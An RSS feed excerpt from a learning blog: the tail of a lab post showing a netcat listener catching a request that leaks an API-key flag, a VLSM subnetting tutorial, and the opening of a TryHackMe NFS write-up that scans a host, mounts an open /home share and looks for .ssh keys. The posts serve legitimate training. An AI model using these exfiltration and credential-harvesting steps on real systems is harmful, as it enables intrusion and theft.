</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.245.216<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">34718</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Host: 10.6.67.243:8087
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Accept: */*
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>X-API-KEY: THM<span style="color:#89dceb;font-weight:bold">{</span>Hello_Im_just_an_API_key<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] VLSM</title>
      <link>http://localhost:1313/til-vlsm/</link>
      <pubDate>Thu, 27 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-vlsm/</guid>
      <description>VLSM (Variable-Length Subnet Masks) Until now, I have practiced subnetting used FLSM (Fixed-Length Subnet Masks). This means that all of the subnets use the same prefix length (ie. subnetting a Class C network into 4 subnets using /26).
VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.
Here&amp;rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto.</description>
      <content:encoded><![CDATA[<h3 id="vlsm-variable-length-subnet-masks">VLSM (Variable-Length Subnet Masks)</h3>
<p>Until now, I have practiced subnetting used FLSM (Fixed-Length Subnet Masks). This means that all of the subnets use the same prefix length (ie. subnetting a Class C network into 4 subnets using /26).</p>
<p>VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.</p>
<br>
<div style="text-align: center"><img src="./image-34.png"></div>
<p>Here&rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto. We are assigned the <code>192.168.1.0/24</code> network and must divide it into 5 subnets to provide IP addresses for all hosts in the enterprise network.</p>
<p>If we were to try this with FLSM (Fixed-length subnet masks), we would need to borrow 3 bits to make enough subnets. That would leave 5 host bits left. 5 host bits only allow 30 host addresses, so that&rsquo;s not enough addresses for Tokyo LAN A and Toronto LAN B.</p>
<p>However, if we use VLSM we can assign different subnet sizes to each LAN, which will allow us to make sure each LAN has enough addresses available.</p>
<br>
<h3 id="steps-to-subnet-using-vlsm">Steps to subnet using VLSM</h3>
<ol>
<li>Assign the largest subnet at the start of the address space.</li>
<li>Assign the second-largest subnet after it.</li>
<li>Repeat the process until all subnets have been assigned.</li>
</ol>
<p>If we look at our network above, we will assign subnets in this following order:</p>
<ol>
<li>Tokyo LAN A</li>
<li>Toronto LAN B</li>
<li>Toronto LAN A</li>
<li>Tokyo LAN B</li>
<li>point-to-point connection</li>
</ol>
<br>
<h3 id="tokyo-lan-a">Tokyo LAN A</h3>
<p>Because we need to accommodate 110 hosts for Tokyo LAN A, we have to have at least 7 host bits, which leads to /25 prefix length.</p>
<p>Convert the original address to binary bits</p>
<ul>
<li>11000000.10101000.00000001.00000000</li>
</ul>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.00000000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.01111111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.0/25
Broadcast address: 192.168.1.127/25
First usable address: 192.168.1.1/25
Last usable address: 192.168.1.126/25
Total number of usable host addresses: 2^7 - 2 = 126</code></pre>
<br>
<h3 id="toronto-lan-b">Toronto LAN B</h3>
<p>We have our first subnet, 192.168.1.0/25 for Tokyo LAN A. The network address of Toronto LAN B should be 192.168.1.128, just 1 up Tokyo LAN A&rsquo;s broadcast address. However, we have to calculate what prefix length we should use for Toronto LAN B.</p>
<p>Because Toronto LAN B has to have 45 hosts, that means we have to have 6 host bits. That means, the prefix length of the subnet is going to be /26.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.10000000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.10111111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.128/26
Broadcast address: 192.168.1.191/26
First usable address: 192.168.1.129/26
Last usable address: 192.168.1.190/26
Total number of usable host addresses: 2^6 - 2 = 62</code></pre>
<br>
<h3 id="toronto-lan-a">Toronto LAN A</h3>
<p>Next is subnetting Toronto LAN A. The broadcast address of the previous subnet, Toronto LAN B, is 192.168.1.191/26. So, the network address of Toronto LAN A is 192.168.1.192, we just need to figure out the prefix length.</p>
<p>Since we need to accommodate 29 hosts, we need to have 5 host bits. 2 ^ 5 - 2 = 30, which means the prefix length of the subnet is going to be /27.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11000000</li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li>11000000.10101000.00000001.11011111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.192/27
Broadcast address: 192.168.1.223/27
First usable address: 192.168.1.193/27
Last usable address: 192.168.1.222/27
Total number of usable host addresses: 30</code></pre>
<br>
<h3 id="tokyo-lan-b">Tokyo LAN B</h3>
<p>The broadcast address of Toronto LAN A is 192.168.1.223/27. To get the network address of Tokyo LAN B, we just need to add 1 to it. 192.168.1.224. Tokyo LAN B needs to have 8 hosts, which means 4 host bits are needed. The prefix length is /28.</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11100000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.11101111</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.224/28
Broadcast address: 192.168.1.239/28
First usable address: 192.168.1.225/28
Last usable address: 192.168.1.238/28
Total number of usable host addresses: 2 ^ 4 - 2 = 14.</code></pre>
<br>
<h3 id="point-to-point-connection">Point-to-point connection</h3>
<p>The broadcast address of Tokyo LAN B is 192.168.1.239. Therefore, the network address of point-to-point connection is 192.168.1.240. Since this is a point-to-point connection, we only need to accommodate 2 hosts. Two answers are possible for this, the first choice is /31 prefix length. However, for the CCNA test, if you are asked what prefix length to use for a subnet that requires two hosts, it is recommended not using a /31 prefix length.</p>
<p>Then, our other option is /30 prefix length because we need 2 host bits. (2 ^ 2 - 2 = 2).</p>
<p>Network address in binary</p>
<ul>
<li>11000000.10101000.00000001.11110000</li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li>11000000.10101000.00000001.11110011</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.1.240/30
Broadcast address: 192.168.1.243/30
First usable address: 192.168.1.241/30
Last usable address: 192.168.1.242/30
Total number of usable host addresses: 2</code></pre>
<br>
<div style="text-align: center"><img src="./image-34.png"></div>
Notice that each subnet uses a different prefix length. If we tried to use the same prefix length for each subnet, there wouldn't be enough address space.
<hr>
<h3 id="vlsm-lab">VLSM LAB</h3>
<p><img src="image.png" alt="alt text"></p>
<p>We will assign the subnets in the following order:</p>
<ol>
<li>LAN 2 (64 hosts)</li>
<li>LAN 1 (45 hosts)</li>
<li>LAN 3 (14 hosts)</li>
<li>LAN 4 (9 hosts)</li>
<li>Point-to-point (2 hosts)</li>
</ol>
<h4 id="lan-2">LAN 2</h4>
<p>convert the <code>192.168.5.0/24</code> network address to binary:</p>
<ul>
<li><code>11000000.10101000.00000101.000000</code></li>
</ul>
<p>Because we have to accommodate 64 hosts for LAN 2, we need 7 host bits <code>2^7 - 2 = 126</code>. That means, the prefix length of the subent will be <code>/25</code>.</p>
<p>Network address in binary</p>
<ul>
<li><code>11000000.10101000.00000101.000000</code></li>
</ul>
<p>Broadcast address in binary</p>
<ul>
<li><code>11000000.10101000.00000101.01111111</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.0/25
Broadcast address: 192.168.5.127/25
First usable address: 192.168.5.1/25
Last usable address: 192.168.5.126/25</code></pre>
<h4 id="lan-1">LAN 1</h4>
<p>The subnet with the second biggest hosts is LAN 1.
We know the broadcast address of LAN 2, so the network address of LAN 1 is just <code>broadcast address of LAN 2 + 1</code>.</p>
<p>However, we still need to find the prefix length. LAN 1 needs to accomodate 45 hosts, which needs 6 host bits. That leads to <code>/26</code> prefix length.</p>
<p>Convert the network address <code>192.168.5.128/26</code> to binary:</p>
<ul>
<li><code>11000000.10101000.00000101.10000000</code>.</li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.10111111</code>.</li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.128/26
Broadcast address: 192.168.5.191/26
First usable address: 192.168.5.129/26
Last usable address: 192.168.5.190/26</code></pre>
<h4 id="lan-3">LAN 3</h4>
<p>Network address: <code>192.168.5.192</code>
prefix length: <code>/28</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11000000</code></li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11001111</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.192/28
Broadcast address: 192.168.5.207/28
First usable address: 192.168.5.193/28
Last usable address: 192.168.5.206/28</code></pre>
<h3 id="lan-4">LAN 4</h3>
<p>Network address: <code>192.168.5.208</code>
Prefix length:<code>/28</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11010000</code></li>
</ul>
<p>Broadcast address in binary:
<code>11000000.10101000.00000101.11011111</code></p>






<pre tabindex="0"><code>Network address: 192.168.5.208/28
Broadcast address: 192.168.5.223/28
First usable address: 192.168.5.209/28
Last usable address: 192.168.5.222/28</code></pre>
<h3 id="point-to-point">Point-to-point</h3>
<p>Network address: <code>192.168.5.224</code>
prefix length: <code>/30</code></p>
<p>Network address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11100000</code></li>
</ul>
<p>Broadcast address in binary:</p>
<ul>
<li><code>11000000.10101000.00000101.11100011</code></li>
</ul>






<pre tabindex="0"><code>Network address: 192.168.5.224/30
Broadcast address: 192.168.5.227/30
First usable address: 192.168.5.225/30
Last usable address: 192.168.5.226/30</code></pre>
<hr>
<p>Resources for practicing subnetting</p>
<ul>
<li><a href="http://www.subnettingquestions.com">http://www.subnettingquestions.com</a></li>
<li><a href="http://subnetting.org">http://subnetting.org</a></li>
<li><a href="https://subnettingpractice.com">https://subnettingpractice.com</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Network Services 2</title>
      <link>http://localhost:1313/thm-network-services-2/</link>
      <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-network-services-2/</guid>
      <description>This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS Understanding NFS What does NFS stand for?
Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
Mounting By using NFS, users and programs can access files on remote systems as if they were local files.</description>
      <content:encoded><![CDATA[<p>This is the second series on Network Services in the <code>Network Exploitation Basics</code> module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.</p>
<h3 id="nfs">NFS</h3>
<hr>
<h4 id="understanding-nfs">Understanding NFS</h4>
<p>What does NFS stand for?</p>






<pre tabindex="0"><code>Network File System</code></pre>
<br>
<p>What process allows an NFS client to interact with a remote directory as though it was a physical drive?</p>






<pre tabindex="0"><code>Mounting</code></pre>
<p>By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.</p>
<br>
<p>What does NFS use to represent files and directories on the server?</p>






<pre tabindex="0"><code>file handle</code></pre>
<p>The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.
<br>
<br></p>
<p>What protocol does NFS use to communicate between the server and client?</p>






<pre tabindex="0"><code>RPC</code></pre>
<br>
<p>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1/parameter 2</p>






<pre tabindex="0"><code>user id / group id</code></pre>
<br>
<p>Can a Windows NFS server share files with a Linux client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Linux NFS server share files with a MacOS client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<p>Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or Unix.
A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows server to access files stored on a non-Windows NFS server.
<br>
<br></p>
<p>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.</p>






<pre tabindex="0"><code>4.2</code></pre>
<br>
<h4 id="enumerating-nfs">Enumerating NFS</h4>
<h5 id="requirements">Requirements</h5>
<p>In order to do a more advanced enumeration of the NFS server, and shares – we&rsquo;re going to need a few tools.</p>
<ol>
<li>
<p>NFS-Common</p>
<p>It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with &ldquo;showmount&rdquo; and &ldquo;mount.nfs&rdquo; as these are going to be most useful to us when it comes to extracting information from the NFS share</p>
</li>
<li>
<p>Port Scanning</p>
</li>
<li>
<p>Mounting NFS shares</p>
<p>Your client&rsquo;s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you&rsquo;ve created this mount point, you can use the &ldquo;mount&rdquo; command to connect the NFS share to the mount point on your machine like so: <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></p>
<p><code>sudo</code> : run as root <br>
<code>mount</code> : execute the mount command <br>
<code>-t nfs</code> : type of device to mount, then specifying that it&rsquo;s NFS <br>
<code>IP:share</code>: the IP address of the NFS server, and the name of the share we wish to mount <br>
<code>-nolock</code>: specifies not to use NLM locking</p>
</li>
</ol>
<br>
<p>Conduct a thorough port scan of your choosing, how many ports are open?</p>






<pre tabindex="0"><code>7</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>PORT STATE SERVICE REASON VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>22/tcp open ssh syn-ack ttl <span style="color:#fab387">64</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>| <span style="color:#fab387">2048</span> 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>| <span style="color:#fab387">256</span> 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s<span style="color:#89dceb;font-weight:bold">=</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>| <span style="color:#fab387">256</span> bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e <span style="color:#89dceb;font-weight:bold">(</span>EdDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqYlGyJzySWsOMejWbc9mf3mFzerVbrty8i6PCOR7lv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>111/tcp open rpcbind syn-ack ttl <span style="color:#fab387">64</span> 2-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100000)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>| rpcinfo:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>| program version port/proto service
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/tcp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/udp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>| <span style="color:#fab387">100005</span> 1,2,3 52691/tcp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>| <span style="color:#fab387">100005</span> 1,2,3 57133/udp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>| <span style="color:#fab387">100021</span> 1,3,4 34475/tcp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>| <span style="color:#fab387">100021</span> 1,3,4 48911/udp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>| <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/tcp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>|_ <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/udp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>2049/tcp open nfs_acl syn-ack ttl <span style="color:#fab387">64</span> <span style="color:#fab387">3</span> <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100227)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>34475/tcp open nlockmgr syn-ack ttl <span style="color:#fab387">64</span> 1-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100021)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>46359/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>52691/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>56583/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span></span></span></code></pre></div>
<br>
<p>Which port contains the service we&rsquo;re looking to enumerate?</p>






<pre tabindex="0"><code>2049</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs</span></span></code></pre></div>
<br>
<p>Now, use <code>/usr/sbin/showmount -e [IP]</code> to list the NFS shares, what is the name of the visible share?</p>






<pre tabindex="0"><code>/home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# /usr/sbin/showmount -e 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Export list <span style="color:#cba6f7">for</span> 10.10.14.167:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>/home <span style="color:#89b4fa">\*</span></span></span></code></pre></div>
<br>
Time to mount the share to our local machine!
<p>First, use <code>mkdir /tmp/mount</code> to create a directory on your machine to mount the share to. This is in the /tmp directory - so be aware that it will be removed on restart.</p>
<p>Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share – what is the name of the folder inside?</p>






<pre tabindex="0"><code>cappucino</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# mkdir /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-87-146:~# sudo mount -t nfs 10.10.14.167:home /tmp/mount/ -nolock
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@ip-10-10-87-146:~# <span style="color:#89dceb">cd</span> /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root@ip-10-10-87-146:/tmp/mount# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>cappucino</span></span></code></pre></div>
<br>
<p>Have a look inside the directory, look at the files. Looks like we&rsquo;re inside a user&rsquo;s home directory&hellip;</p>
<p>Interesting! Let&rsquo;s do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?</p>






<pre tabindex="0"><code>.ssh</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">5</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
